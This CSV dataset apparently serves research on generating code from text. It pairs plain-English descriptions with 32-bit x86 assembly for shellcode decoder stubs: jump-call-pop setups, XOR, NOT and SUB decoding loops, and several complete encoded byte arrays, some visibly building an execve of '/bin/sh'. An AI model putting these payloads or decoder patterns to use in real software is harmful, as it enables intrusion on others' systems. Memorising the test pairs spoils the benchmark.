raw_nl,temp_nl,raw_code,temp_code
_start label,var0 label,_start :,var0 :
_start,var0,_start :,var0 :
define the _start label and jump short to the call_decoder,define var0 label and jump short var1,_start : \n jmp call_decoder,var0 : \n jmp var1
define the _start label and jump to the call_decoder,define var0 label and jump var1,_start : \n jmp call_decoder,var0 : \n jmp var1
define the _start label and jump to call_decoder,define var0 label and jump var1,_start : \n jmp call_decoder,var0 : \n jmp var1
define the _start label and jump short to the call_decoder,define var0 label and jump short var1,_start : \n jmp short call_decoder,var0 : \n jmp short var1
define the _start label and jump short to call_decoder,define var0 label and jump short var1,_start : \n jmp short call_decoder,var0 : \n jmp short var1
define the _start label and jump short to the call_shellcode,define var0 label and jump short var1,_start : \n jmp short call_shellcode,var0 : \n jmp short var1
define the _start label and jump short to call_shellcode,define var0 label and jump short var1,_start : \n jmp short call_shellcode,var0 : \n jmp short var1
define the _start label and jump short to call_shellcode label,define var0 label and jump short var1 label,_start : \n jmp short call_shellcode,var0 : \n jmp short var1
define the _start label and jump short to enc,define var0 label and jump short var1,_start : \n jmp short enc,var0 : \n jmp short var1
define the _start label and jump short to stage,define var0 label and jump short stage,_start : \n jmp short stage,var0 : \n jmp short stage
add 0x2 to al,add var0 al,"add al , 0x2","add al , var0"
add 3 to al,add 3 al,"add al , 3","add al , 3"
add 0x02 to the current byte in esi,add var0 current byte var1,"add byte [esi] , 0x02","add byte [var1] , var0"
add 0x10 to the current byte in esi,add var0 current byte var1,"add byte [esi] , 0x10","add byte [var1] , var0"
add 4 to eax and jump to decode if the result is not zero,add 4 var0 and jump decode if result not zero,"add eax , 4 \n jnz decode","add var0 , 4 \n jnz decode"
add the value on ebx to eax,add value var0 var1,"add eax , ebx","add var1 , var0"
add 0x2 to ebp,add var0 var1,"add ebp , 0x2","add var1 , var0"
add 2 to edi,add 2 var0,"add edi , 2","add var0 , 2"
add 2 to the contents of esi,add 2 contents var0,"add esi , 2","add var0 , 2"
call the decoder function,call var0 function,call decoder,call var0
call decoder,call decoder,call decoder,call decoder
call decoder_setup,call var0,call decoder_setup,call var0
call returnlabel,call var0,call returnlabel,call var0
define call_decoded and execute it,define var0 and execute it,call_decoded : \n call [esp],var0 : \n call [esp]
define call_decoder,define var0,call_decoder :,var0 :
call_decoder label,var0 label,call_decoder :,var0 :
define call_decoder and call decoder function,define var0 and call var2 function,call_decoder : \n call decoder,var0 : \n call var2
define the call_decoder label and call the decoder function,define var0 label and call var2 function,call_decoder : \n call decoder,var0 : \n call var2
define call_decoder and call decoder,define var0 and call decoder,call_decoder : \n call decoder,var0 : \n call decoder
"in the function call_decoder call the decoder routine and define shellcode as array of bytes 0xeb,0x25,0x5e,0x31,0xc9,0xb1,0x1e,0x80,0x3e,0x07,0x7c,0x05,0x80,0x2e,0x07,0xeb,0x11,0x31,0xdb,0x31,0xd2,0xb3,0x07,0xb2,0xff,0x66,0x42,0x2a,0x1e,0x66,0x29,0xda,0x88,0x16,0x46,0xe2,0xe2,0xeb,0x05,0xe8,0xd6,0xff,0xff,0xff,0x38,0xc7,0x57,0x6f,0x69,0x68,0x7a,0x6f,0x6f,0x69,0x70,0x75,0x36,0x6f,0x36,0x36,0x36,0x36,0x90,0xea,0x57,0x90,0xe9,0x5a,0x90,0xe8,0xb7,0x12,0xd4,0x87",in function var0 call var2 routine and define shellcode array bytes var3,"call_decoder : \n call decoder \n shellcode : db 0xeb , 0x25 , 0x5e , 0x31 , 0xc9 , 0xb1 , 0x1e , 0x80 , 0x3e , 0x07 , 0x7c , 0x05 , 0x80 , 0x2e , 0x07 , 0xeb , 0x11 , 0x31 , 0xdb , 0x31 , 0xd2 , 0xb3 , 0x07 , 0xb2 , 0xff , 0x66 , 0x42 , 0x2a , 0x1e , 0x66 , 0x29 , 0xda , 0x88 , 0x16 , 0x46 , 0xe2 , 0xe2 , 0xeb , 0x05 , 0xe8 , 0xd6 , 0xff , 0xff , 0xff , 0x38 , 0xc7 , 0x57 , 0x6f , 0x69 , 0x68 , 0x7a , 0x6f , 0x6f , 0x69 , 0x70 , 0x75 , 0x36 , 0x6f , 0x36 , 0x36 , 0x36 , 0x36 , 0x90 , 0xea , 0x57 , 0x90 , 0xe9 , 0x5a , 0x90 , 0xe8 , 0xb7 , 0x12 , 0xd4 , 0x87","var0 : \n call var2 \n shellcode : db 0xeb , 0x25 , 0x5e , 0x31 , 0xc9 , 0xb1 , 0x1e , 0x80 , 0x3e , 0x07 , 0x7c , 0x05 , 0x80 , 0x2e , 0x07 , 0xeb , 0x11 , 0x31 , 0xdb , 0x31 , 0xd2 , 0xb3 , 0x07 , 0xb2 , 0xff , 0x66 , 0x42 , 0x2a , 0x1e , 0x66 , 0x29 , 0xda , 0x88 , 0x16 , 0x46 , 0xe2 , 0xe2 , 0xeb , 0x05 , 0xe8 , 0xd6 , 0xff , 0xff , 0xff , 0x38 , 0xc7 , 0x57 , 0x6f , 0x69 , 0x68 , 0x7a , 0x6f , 0x6f , 0x69 , 0x70 , 0x75 , 0x36 , 0x6f , 0x36 , 0x36 , 0x36 , 0x36 , 0x90 , 0xea , 0x57 , 0x90 , 0xe9 , 0x5a , 0x90 , 0xe8 , 0xb7 , 0x12 , 0xd4 , 0x87"
call_shellcode function,var0 function,call_shellcode :,var0 :
call_shellcode routine,var0 routine,call_shellcode :,var0 :
define the call_shellcode label and call the decoder function,define var0 label and call var2 function,call_shellcode : \n call decoder,var0 : \n call var2
define the call_shellcode function and call decoder,define var0 function and call decoder,call_shellcode : \n call decoder,var0 : \n call decoder
define call_shellcode and call decoder function,define var0 and call var2 function,call_shellcode : \n call decoder,var0 : \n call var2
in call_shellcode call the decoder function,in var0 call var2 function,call_shellcode : \n call decoder,var0 : \n call var2
in call_shellcode execute the decoder routine,in var0 execute var2 routine,call_shellcode : \n call decoder,var0 : \n call var2
define check_even_odd,define var0,check_even_odd :,var0 :
jump short to decode if al is not equal to cl else jump to shellcode,jump short decode if al not equal cl else jump shellcode,"cmp al , cl \n jnz short decode \n jmp shellcode","cmp al , cl \n jnz short decode \n jmp shellcode"
jump to shellcode if bl is equal to 0xaa,jump shellcode if var0 equal var1,"cmp bl , 0xaa \n jz shellcode","cmp var0 , var1 \n jz shellcode"
jump to xordecode if bl is equal to 0xbb else jump to notdecode,jump var0 if var1 equal var2 else jump var3,"cmp bl , 0xbb \n jz xordecode \n jmp notdecode","cmp var1 , var2 \n jz var0 \n jmp var3"
jump to shellcode label if the byte in esi is equal to 0x88,jump shellcode label if byte var0 equal var1,"cmp byte [esi] , 0x88 \n jz shellcode","cmp byte [var0] , var1 \n jz shellcode"
jump to not_equal if the current byte of the shellcode is not equal to bl,jump var0 if current byte shellcode not equal var1,"cmp byte [esi] , bl \n jne not_equal","cmp byte [esi] , var1 \n jne var0"
jump to execute_shellcode if the doubleword in esi+edx+5 is equal to edi,jump var0 if doubleword var2 equal var3,"cmp dword [esi+edx+5] , edi \n jz execute_shellcode","cmp dword [var2] , var3 \n jz var0"
in common_commands point to the next byte in esi,in var0 point next byte var1,common_commands : \n inc esi,var0 : \n inc var1
define cycle,define cycle,cycle :,cycle :
decrement the al register and jump to shellcode if the result is zero,decrement al register and jump shellcode if result zero,dec al \n jz shellcode,dec al \n jz shellcode
decrease ebx by 1,decrease var0 1,dec ebx,dec var0
decode_loop,var0,decode_loop :,var0 :
decode_pr function,var0 function,decode_pr :,var0 :
define the decode label,define decode label,decode :,decode :
function decode,function decode,decode :,decode :
decode function,var0 function,decode :,var0 :
decode routine,var0 routine,decode :,var0 :
decode label,decode label,decode :,decode :
in the decode function jump to lowbound label if the current byte of the shellcode is lower than 0x7 else subtract 0x7 from the byte of the shellcode and jump to common_commands,in var0 function jump var1 label if current byte shellcode lower var2 else subtract var2 byte shellcode and jump var5,"decode : \n cmp byte [esi] , 0x7 \n jl lowbound \n sub byte [esi] , 0x7 \n jmp common_commands","var0 : \n cmp byte [esi] , var2 \n jl var1 \n sub byte [esi] , var2 \n jmp var5"
in decode move the current byte of the shellcode in the bl register,in decode move current byte shellcode var0 register,"decode : \n mov bl , byte [esi]","decode : \n mov var0 , byte [esi]"
define the decode function and negate the byte in esi,define var0 function and negate byte var1,decode : \n not byte [esi],var0 : \n not byte [var1]
define decode function and subtract 13 from the current byte of the shellcode,define var0 function and subtract 13 current byte shellcode,"decode : \n sub byte [esi] , 13","var0 : \n sub byte [esi] , 13"
define the decode function and perform the xor operation between the byte in esi and the 0xaa value,define var0 function and perform xor operation byte var1 and var2 value,"decode : \n xor byte [esi] , 0xaa","var0 : \n xor byte [var1] , var2"
declare the decoded_shellcode label and call the stack,declare var0 label and call stack,decoded_shellcode : \n call [esp],var0 : \n call [esp]
decoder_setup label,var0 label,decoder_setup :,var0 :
define the decoder function,define var0 function,decoder :,var0 :
decoder function,var0 function,decoder :,var0 :
decoder routine,var0 routine,decoder :,var0 :
declare the label decoder,declare label decoder,decoder :,decoder :
define decoder,define decoder,decoder :,decoder :
decoder's main,decoder's main,decoder :,decoder :
decoder label,decoder label,decoder :,decoder :
define the decoder function and store the encoded shellcode pointer in the esi register,define var0 function and store encoded shellcode pointer var1 register,decoder : \n pop esi,var0 : \n pop var1
in the decoder routine save the shellcode in esi,in var0 routine save shellcode var1,decoder : \n pop esi,var0 : \n pop var1
in decoder save the shellcode in esi and move it to edi,in decoder save shellcode var0 and move it var1,"decoder : \n pop esi \n mov edi , esi","decoder : \n pop var0 \n mov var1 , var0"
define enc function and call decoder,define var0 function and call decoder,enc : \n call decoder,var0 : \n call decoder
"encoded_shellcode is an array of bytes 0xc0, 0x31, 0x68, 0x50, 0x2f, 0x2f, 0x68, 0x73, 0x2f, 0x68, 0x69, 0x62, 0x87, 0x6e, 0xb0, 0xe3, 0xcd, 0x0b, 0x90, 0x80",var0 array bytes var1,"encoded_shellcode : db 0xc0 , 0x31 , 0x68 , 0x50 , 0x2f , 0x2f , 0x68 , 0x73 , 0x2f , 0x68 , 0x69 , 0x62 , 0x87 , 0x6e , 0xb0 , 0xe3 , 0xcd , 0x0b , 0x90 , 0x80",var0 : db var1
"define encoded_shellcode as array of words 0x545, 0x4a3, 0x583, 0x5d3, 0x541, 0x541, 0x439, 0x5d3, 0x5d3, 0x541, 0x5e7, 0x5d5, 0x5cf, 0x411, 0x4eb, 0x443, 0x509, 0x48d, 0x423, 0x539",define var0 array words var1,"encoded_shellcode : dw 0x545 , 0x4a3 , 0x583 , 0x5d3 , 0x541 , 0x541 , 0x439 , 0x5d3 , 0x5d3 , 0x541 , 0x5e7 , 0x5d5 , 0x5cf , 0x411 , 0x4eb , 0x443 , 0x509 , 0x48d , 0x423 , 0x539",var0 : dw var1
"encoded is the array of bytes 0xaa,0x62,0xc0,0xaa,0xa0,0xaa,0xd0,0xaa,0x5e,0xaa,0x5e,0xaa,0xe6,0xaa,0xd0,0xaa,0xd0,0xaa,0x5e,0xaa,0xc4,0xaa,0xd2,0xaa,0xdc,0x89,0xe3,0xaa,0xa0,0x89,0xe2,0xaa,0xa6,0x89,0xe1,0xb0,0xaa,0x16,0xcd,0x80,0xbb",encoded array bytes var0,"encoded : db 0xaa , 0x62 , 0xc0 , 0xaa , 0xa0 , 0xaa , 0xd0 , 0xaa , 0x5e , 0xaa , 0x5e , 0xaa , 0xe6 , 0xaa , 0xd0 , 0xaa , 0xd0 , 0xaa , 0x5e , 0xaa , 0xc4 , 0xaa , 0xd2 , 0xaa , 0xdc , 0x89 , 0xe3 , 0xaa , 0xa0 , 0x89 , 0xe2 , 0xaa , 0xa6 , 0x89 , 0xe1 , 0xb0 , 0xaa , 0x16 , 0xcd , 0x80 , 0xbb","encoded : db 0xaa , 0x62 , 0xc0 , 0xaa , 0xa0 , 0xaa , 0xd0 , 0xaa , 0x5e , 0xaa , 0x5e , 0xaa , 0xe6 , 0xaa , 0xd0 , 0xaa , 0xd0 , 0xaa , 0x5e , 0xaa , 0xc4 , 0xaa , 0xd2 , 0xaa , 0xdc , 0x89 , 0xe3 , 0xaa , 0xa0 , 0x89 , 0xe2 , 0xaa , 0xa6 , 0x89 , 0xe1 , 0xb0 , 0xaa , 0x16 , 0xcd , 0x80 , 0xbb"
"define encoded as array of words 0x04, 0x539, 0x9d9, 0x6c9, 0xfc9, 0xc49, 0xc29, 0x839, 0xdf9, 0xc49, 0xc49, 0x839, 0x839, 0xce9, 0xc59, 0x259, 0x4f9, 0xfc9, 0x259, 0x4e9, 0xff9, 0x259, 0x4d9, 0x1c9, 0xa79, 0x619, 0x2c9, 0x539",define encoded array words var0,"encoded : dw 0x04 , 0x539 , 0x9d9 , 0x6c9 , 0xfc9 , 0xc49 , 0xc29 , 0x839 , 0xdf9 , 0xc49 , 0xc49 , 0x839 , 0x839 , 0xce9 , 0xc59 , 0x259 , 0x4f9 , 0xfc9 , 0x259 , 0x4e9 , 0xff9 , 0x259 , 0x4d9 , 0x1c9 , 0xa79 , 0x619 , 0x2c9 , 0x539",encoded : dw var0
define the array of bytes encodedshellcode and initialize to \xeb\x1d\x5e\x8d\x7e\x01\x31\xc0\xb0\x01\x31\xdb\x8a\x1c\x06\x80\xf3\xaa\x75\x10\x8a\x5c\x06\x01\x88\x1f\x47\x04\x02\xeb\xed\xe8\xde\xff\xff\xff\x31\xaa\xc0\xaa\x50\xaa\x68\xaa\x2f\xaa\x2f\xaa\x73\xaa\x68\xaa\x68\xaa\x2f\xaa\x62\xaa\x69\xaa\x6e\xaa\x89\xaa\xe3\xaa\x50\xaa\x89\xaa\xe2\xaa\x53\xaa\x89\xaa\xe1\xaa\xb0\xaa\x0b\xaa\xcd\xaa\x80\xaa\xbb\xbb,define array bytes var0 and initialize tovar1,encodedshellcode : db \xeb\x1d\x5e\x8d\x7e\x01\x31\xc0\xb0\x01\x31\xdb\x8a\x1c\x06\x80\xf3\xaa\x75\x10\x8a\x5c\x06\x01\x88\x1f\x47\x04\x02\xeb\xed\xe8\xde\xff\xff\xff\x31\xaa\xc0\xaa\x50\xaa\x68\xaa\x2f\xaa\x2f\xaa\x73\xaa\x68\xaa\x68\xaa\x2f\xaa\x62\xaa\x69\xaa\x6e\xaa\x89\xaa\xe3\xaa\x50\xaa\x89\xaa\xe2\xaa\x53\xaa\x89\xaa\xe1\xaa\xb0\xaa\x0b\xaa\xcd\xaa\x80\xaa\xbb\xbb,var0 : dbvar1
"define the array of bytes encodedshellcode and initialize to 0x32,0x51,0x30,0x74,0x69,0x63,0x6f,0xe4,0x8a,0x54,0xe2,0x0c,0x81,0xc1,0x69,0x30,0x69,0x30,0x6a,0x8a,0x51,0xe3,0x8a,0xb1,0xce",define array bytes var0 and initialize var1,"encodedshellcode : db 0x32 , 0x51 , 0x30 , 0x74 , 0x69 , 0x63 , 0x6f , 0xe4 , 0x8a , 0x54 , 0xe2 , 0x0c , 0x81 , 0xc1 , 0x69 , 0x30 , 0x69 , 0x30 , 0x6a , 0x8a , 0x51 , 0xe3 , 0x8a , 0xb1 , 0xce","var0 : db 0x32 , 0x51 , 0x30 , 0x74 , 0x69 , 0x63 , 0x6f , 0xe4 , 0x8a , 0x54 , 0xe2 , 0x0c , 0x81 , 0xc1 , 0x69 , 0x30 , 0x69 , 0x30 , 0x6a , 0x8a , 0x51 , 0xe3 , 0x8a , 0xb1 , 0xce"
"encodedshellcode is the array of bytes 0x43,0xed,0x1d,0xf4,0x40,0xfb,0x6f,0x7a,0xa9,0xe,0xb6,0xe,0xbc,0xc9,0xe3,0x7a,0xaf,0x7a,0x78,0xe,0xc5,0xda,0x76,0x6a,0x17,0x1a,0x4e,0x68,0x38,0xc2,0x99,0xfb,0x35,0x68,0x84,0xd2,0xb3,0xcb,0x7c,0x68,0x78,0xe2,0x9a,0xf5,0xe9,0x50,0xc0,0x24,0x91,0xf8,0xfe",var0 array bytes var1,"encodedshellcode : db 0x43 , 0xed , 0x1d , 0xf4 , 0x40 , 0xfb , 0x6f , 0x7a , 0xa9 , 0xe , 0xb6 , 0xe , 0xbc , 0xc9 , 0xe3 , 0x7a , 0xaf , 0x7a , 0x78 , 0xe , 0xc5 , 0xda , 0x76 , 0x6a , 0x17 , 0x1a , 0x4e , 0x68 , 0x38 , 0xc2 , 0x99 , 0xfb , 0x35 , 0x68 , 0x84 , 0xd2 , 0xb3 , 0xcb , 0x7c , 0x68 , 0x78 , 0xe2 , 0x9a , 0xf5 , 0xe9 , 0x50 , 0xc0 , 0x24 , 0x91 , 0xf8 , 0xfe","var0 : db 0x43 , 0xed , 0x1d , 0xf4 , 0x40 , 0xfb , 0x6f , 0x7a , 0xa9 , 0xe , 0xb6 , 0xe , 0xbc , 0xc9 , 0xe3 , 0x7a , 0xaf , 0x7a , 0x78 , 0xe , 0xc5 , 0xda , 0x76 , 0x6a , 0x17 , 0x1a , 0x4e , 0x68 , 0x38 , 0xc2 , 0x99 , 0xfb , 0x35 , 0x68 , 0x84 , 0xd2 , 0xb3 , 0xcb , 0x7c , 0x68 , 0x78 , 0xe2 , 0x9a , 0xf5 , 0xe9 , 0x50 , 0xc0 , 0x24 , 0x91 , 0xf8 , 0xfe"
"define the array of bytes encodedshellcode and initialize it to 0xd6,0x47,0xb7,0x9f,0xd8,0xd8,0x94,0x9f,0x9f,0xd8,0xa5,0x9e,0x99,0x7e,0x24,0xb7,0x7e,0x25,0xb4,0x7e,0x26,0x57,0xfc,0x3a,0x87",define array bytes var0 and initialize it var1,"encodedshellcode : db 0xd6 , 0x47 , 0xb7 , 0x9f , 0xd8 , 0xd8 , 0x94 , 0x9f , 0x9f , 0xd8 , 0xa5 , 0x9e , 0x99 , 0x7e , 0x24 , 0xb7 , 0x7e , 0x25 , 0xb4 , 0x7e , 0x26 , 0x57 , 0xfc , 0x3a , 0x87","var0 : db 0xd6 , 0x47 , 0xb7 , 0x9f , 0xd8 , 0xd8 , 0x94 , 0x9f , 0x9f , 0xd8 , 0xa5 , 0x9e , 0x99 , 0x7e , 0x24 , 0xb7 , 0x7e , 0x25 , 0xb4 , 0x7e , 0x26 , 0x57 , 0xfc , 0x3a , 0x87"
"define the array of bytes encodedshellcode and initialize it to 0xeb,0x0c,0x5e,0x31,0xc9,0xb1,0x19,0xf6,0x16,0x46,0xe2,0xfb,0xeb,0x05,0xe8,0xef,0xff,0xff,0xff,0xce,0x3f,0xaf,0x97,0xd0,0xd0,0x8c,0x97,0x97,0xd0,0x9d,0x96,0x91,0x76,0x1c,0xaf,0x76,0x1d,0xac,0x76,0x1e,0x4f,0xf4,0x32,0x7f",define array bytes var0 and initialize it var1,"encodedshellcode : db 0xeb , 0x0c , 0x5e , 0x31 , 0xc9 , 0xb1 , 0x19 , 0xf6 , 0x16 , 0x46 , 0xe2 , 0xfb , 0xeb , 0x05 , 0xe8 , 0xef , 0xff , 0xff , 0xff , 0xce , 0x3f , 0xaf , 0x97 , 0xd0 , 0xd0 , 0x8c , 0x97 , 0x97 , 0xd0 , 0x9d , 0x96 , 0x91 , 0x76 , 0x1c , 0xaf , 0x76 , 0x1d , 0xac , 0x76 , 0x1e , 0x4f , 0xf4 , 0x32 , 0x7f","var0 : db 0xeb , 0x0c , 0x5e , 0x31 , 0xc9 , 0xb1 , 0x19 , 0xf6 , 0x16 , 0x46 , 0xe2 , 0xfb , 0xeb , 0x05 , 0xe8 , 0xef , 0xff , 0xff , 0xff , 0xce , 0x3f , 0xaf , 0x97 , 0xd0 , 0xd0 , 0x8c , 0x97 , 0x97 , 0xd0 , 0x9d , 0x96 , 0x91 , 0x76 , 0x1c , 0xaf , 0x76 , 0x1d , 0xac , 0x76 , 0x1e , 0x4f , 0xf4 , 0x32 , 0x7f"
"encoder_shellcode is the array of bytes 0x08,0x60,0x58,0xc8,0x39,0xb0,0xd8,0xc3,0x9f,0x9f,0xd1,0xb8,0xb3,0xfe,0xb9,0x1e,0x4e,0xfd,0x97,0x70,0x39,0xb0,0x6a,0xdb,0xb0,0xc4,0x09,0xcf,0x74,0x25,0x76,0xe6,0xe6,0xe6,0xf6,0x90,0x90,0xaa,0xaa",var0 array bytes var1,"encoder_shellcode : db 0x08 , 0x60 , 0x58 , 0xc8 , 0x39 , 0xb0 , 0xd8 , 0xc3 , 0x9f , 0x9f , 0xd1 , 0xb8 , 0xb3 , 0xfe , 0xb9 , 0x1e , 0x4e , 0xfd , 0x97 , 0x70 , 0x39 , 0xb0 , 0x6a , 0xdb , 0xb0 , 0xc4 , 0x09 , 0xcf , 0x74 , 0x25 , 0x76 , 0xe6 , 0xe6 , 0xe6 , 0xf6 , 0x90 , 0x90 , 0xaa , 0xaa","var0 : db 0x08 , 0x60 , 0x58 , 0xc8 , 0x39 , 0xb0 , 0xd8 , 0xc3 , 0x9f , 0x9f , 0xd1 , 0xb8 , 0xb3 , 0xfe , 0xb9 , 0x1e , 0x4e , 0xfd , 0x97 , 0x70 , 0x39 , 0xb0 , 0x6a , 0xdb , 0xb0 , 0xc4 , 0x09 , 0xcf , 0x74 , 0x25 , 0x76 , 0xe6 , 0xe6 , 0xe6 , 0xf6 , 0x90 , 0x90 , 0xaa , 0xaa"
define even_number,define var0,even_number :,var0 :
in execute_shellcode jump short to esp,in var0 jump short esp,execute_shellcode : \n jmp short esp,var0 : \n jmp short esp
define format routine,define var0 routine,format :,var0 :
formatting label,formatting label,formatting :,formatting :
get_shellcode_addr function,var0 function,get_shellcode_addr :,var0 :
declare the global _start label,declare global var0 label,global _start :,global var0 :
global _start,global var0,global _start :,global var0 :
increment dx by one,increment var0 one,inc dx,inc var0
point to the next byte in eax,point next byte var0,inc eax,inc var0
point to the next byte in the eax register,point next byte var0 register,inc eax,inc var0
point to the next position in ecx,point next position var0,inc ecx,inc var0
point to the next byte in ecx,point next byte var0,inc ecx,inc var0
point to the next byte in edi,point next byte var0,inc edi,inc var0
increment edi,increment var0,inc edi,inc var0
point to the next byte in edx,point next byte var0,inc edx,inc var0
point to the next double word in edx,point next double word var0,inc edx \n inc edx \n inc edx \n inc edx,inc var0 \n inc var0 \n inc var0 \n inc var0
point to the next byte in esi,point next byte var0,inc esi,inc var0
next byte in the encoded shellcode,next byte encoded shellcode,inc esi,inc esi
point to the next byte of the shellcode,point next byte shellcode,inc esi,inc esi
move to next byte in esi,move next byte var0,inc esi,inc var0
point to the next word in esi,point next word var0,inc esi \n inc esi,inc var0 \n inc var0
point to the next word of the encoded shellcode,point next word encoded shellcode,inc esi \n inc esi,inc esi \n inc esi
point to the next byte of the shellcode and jump short to decode,point next byte shellcode and jump short decode,inc esi \n jmp short decode,inc esi \n jmp short decode
define inc_dec,define var0,inc_dec :,var0 :
jump to decode,jump decode,jmp decode,jmp decode
jump short to call_decoder,jump short var0,jmp short call_decoder,jmp short var0
go to call_shellcode,go var0,jmp short call_shellcode,jmp short var0
jump short to call_shellcode,jump short var0,jmp short call_shellcode,jmp short var0
jump short to cycle,jump short cycle,jmp short cycle,jmp short cycle
jump short to the label decode,jump short label decode,jmp short decode,jmp short decode
jump short to decode,jump short decode,jmp short decode,jmp short decode
jump back to start of decode,jump back start decode,jmp short decode,jmp short decode
goto the decode_pr to decode the next bytes,var0 var1 decode next bytes,jmp short decode_pr,jmp short var1
jump short to get_shellcode_addr,jump short var0,jmp short get_shellcode_addr,jmp short var0
jump short to inc_dec,jump short var0,jmp short inc_dec,jmp short var0
jump short to main,jump short main,jmp short main,jmp short main
go to shellcode_section,go var0,jmp short shellcode_section,jmp short var0
jump short to switch,jump short switch,jmp short switch,jmp short switch
if zero jump to decoded_shellcode,if zero jump var0,jz decoded_shellcode,jz var0
load the address of edi+2 into edi,load address var0 edi,"lea edi , [edi+2]","lea edi , [var0]"
load the address at esi + 13 into edi,load address var0 var1,"lea edi , [esi+13]","lea var1 , [esi+13]"
load the address of esi into edi,load address var0 var1,"lea edi , [esi]","lea var1 , [var0]"
point edi to the start of the shellcode,point var0 start shellcode,"lea edi , [esi]","lea var0 , [esi]"
load the contents of esi into edi,load contents var0 var1,"lea edi , [esi]","lea var1 , [var0]"
load the address of esi+0x1 into edi,load address var0 var1,"lea edi , [esi+0x1]","lea var1 , [var0]"
load the effective address of esi+2 into esi,load effective address var0 esi,"lea esi , [esi+2]","lea esi , [var0]"
decrease the counter and jump to check_even_odd if not zero else jump short to shellcode,decrease counter and jump var0 if not zero else jump short shellcode,loop check_even_odd \n jmp short shellcode,loop var0 \n jmp short shellcode
decrease the counter and jump to decode if not zero,decrease counter and jump decode if not zero,loop decode,loop decode
decrement the counter and jump to decode if not zero else jump to edx,decrement counter and jump decode if not zero else jump var0,loop decode \n jmp edx,loop decode \n jmp var0
decrement the ecx register and jump to the decode label if the contents of the ecx register is not zero else jump short to the encodedshellcode label,decrement var0 register and jump decode label if contents var0 register not zero else jump short var2 label,loop decode \n jmp encodedshellcode,loop decode \n jmp var2
decrement the ecx register and jump to the decode label if the contents of the ecx register is not zero else jump short to the shellcode label,decrement var0 register and jump decode label if contents var0 register not zero else jump short shellcode label,loop decode \n jmp shellcode,loop decode \n jmp shellcode
decrement the counter and jump to decode routine if it is not zero else jump to shellcode label,decrement counter and jump var0 routine if it not zero else jump shellcode label,loop decode \n jmp shellcode,loop var0 \n jmp shellcode
decrement the counter and jump to the decode label if it is not zero else jump short to the encodedshellcode label,decrement counter and jump decode label if it not zero else jump short var0 label,loop decode \n jmp short encodedshellcode,loop decode \n jmp short var0
decrease the counter and jump to decode if not zero else jump short to shellcode,decrease counter and jump decode if not zero else jump short shellcode,loop decode \n jmp short shellcode,loop decode \n jmp short shellcode
decrement the counter and if it is not zero go back at decode_loop and execute the cicle again else jump to encoded_shellcode,decrement counter and if it not zero go back var0 and execute var1 again else jump var2,loop decode_loop \n jmp short encoded_shellcode,loop var0 \n jmp short var2
lowbound label,var0 label,lowbound :,var0 :
main function,var0 function,main :,var0 :
move al into the address pointed by edi,move al address pointed var0,"mov [edi] , al","mov [var0] , al"
move the contents of the al register into the address pointed by edi,move contents al register address pointed var0,"mov [edi] , al","mov [var0] , al"
swap al value with next byte value in esi,swap al value next byte value var0,"mov [esi] , al","mov [var0] , al"
move the byte in esi into al,move byte var0 al,"mov al , byte [esi]","mov al , byte [var0]"
load the byte pointed by esi in al,load byte pointed var0 al,"mov al , byte [esi]","mov al , byte [var0]"
put the byte at the address esi+1+ebp into al,put byte address var0 al,"mov al , byte [esi+1+ebp]","mov al , byte [var0]"
backup cl into al,backup cl al,"mov al , cl","mov al , cl"
move dl to al,move dl al,"mov al , dl","mov al , dl"
copy the contents of dl into al,copy contents dl al,"mov al , dl","mov al , dl"
move the contents at the address stored in esi into the ax register,move contents address stored var0 ax register,"mov ax , [esi]","mov ax , [var0]"
mov the word at the address edi+1+ecx into ax,var0 word address var1 ax,"mov ax , word [edi+1+ecx]","var0 ax , word [var1]"
move the contents of bl into bh,move contents var0 bh,"mov bh , bl","mov bh , var0"
save the byte in esi+edx+2 in bh,save byte var0 bh,"mov bh , byte [esi+edx+2]","mov bh , byte [var0]"
move the current byte of the shellcode to the bl,move current byte shellcode var0,"mov bl , [esi]","mov var0 , [esi]"
move 0x7 to bl,move var0 var1,"mov bl , 0x7","mov var1 , var0"
move the value 0xff into bl,move value var0 var1,"mov bl , 0xff","mov var1 , var0"
move the byte in eax to bl,move byte var0 var1,"mov bl , byte [eax]","mov var1 , byte [var0]"
move the byte at the address edi+ecx into bl,move byte address var0 var1,"mov bl , byte [edi+ecx]","mov var1 , byte [var0]"
get the byte from edi and save it in bl,get byte var0 and save it var1,"mov bl , byte [edi]","mov var1 , byte [var0]"
move the byte at the address esi + eax +1 into bl,move byte address var0 var1,"mov bl , byte [esi+eax+1]","mov var1 , byte [esi+eax+1]"
move the byte at the address esi + eax into bl,move byte address var0 var1,"mov bl , byte [esi+eax]","mov var1 , byte [esi+eax]"
move the byte at the address esi+edi into bl,move byte address var0 var1,"mov bl , byte [esi+edi]","mov var1 , byte [var0]"
save the byte in esi+edx+1 in bl,save byte var0 var1,"mov bl , byte [esi+edx+1]","mov var1 , byte [var0]"
get the byte from esi and save it in bl,get byte var0 and save it var1,"mov bl , byte [esi]","mov var1 , byte [var0]"
move the byte at the address esi+eax*1 into bl,move byte address var0 var1,"mov bl , byte [esi+eax*1]","mov var1 , byte [var0]"
move the byte at the address esi+eax*1+0x1 into bl and move bl into the byte in edi,move byte address var0 var1 and move var1 byte var3,"mov bl , byte [esi+eax*1+0x1] \n mov byte [edi] , bl","mov var1 , byte [var0] \n mov byte [var3] , var1"
move the byte at the address in [esi+ecx+1] in bl and subtract 0x7 from bl,move the byte at the address in [esi+ecx+1] in bl and subtract 0x7 from bl,"mov bl , byte [esi+ecx+1] \n sub bl , 0x7","mov bl , byte [esi+ecx+1] \n sub bl , 0x7"
backup the contents of cl into bl,backup contents cl var0,"mov bl , cl","mov var0 , cl"
move the contents of the address stored in esi into the bx register,move contents address stored var0 var1 register,"mov bx , [esi]","mov var1 , [var0]"
move dl to the byte pointed by the contents of eax,move dl byte pointed contents var0,"mov byte [eax] , dl","mov byte [var0] , dl"
put the value of bl to the position of edi,put value var0 position var1,"mov byte [edi] , bl","mov byte [var1] , var0"
move bl into the byte in edi and negate the result,move var0 byte var1 and negate result,"mov byte [edi] , bl \n not byte [edi]","mov byte [var1] , var0 \n not byte [var1]"
move bl into the byte in edi and perform xor operation with 0xdd,move var0 byte var1 and perform xor operation var2,"mov byte [edi] , bl \n xor byte [edi] , 0xdd","mov byte [var1] , var0 \n xor byte [var1] , var2"
move bl into the byte at the address edx + eax,move var0 byte address edx + eax,"mov byte [edx+eax] , bl","mov byte [edx+eax] , var0"
move dl into the byte in esi+1,move dl byte esi+1,"mov byte [esi+1] , dl","mov byte [var0] , dl"
move bl into the byte defined by the address esi + eax,move var0 byte defined address esi + eax,"mov byte [esi+eax] , bl","mov byte [esi+eax] , var0"
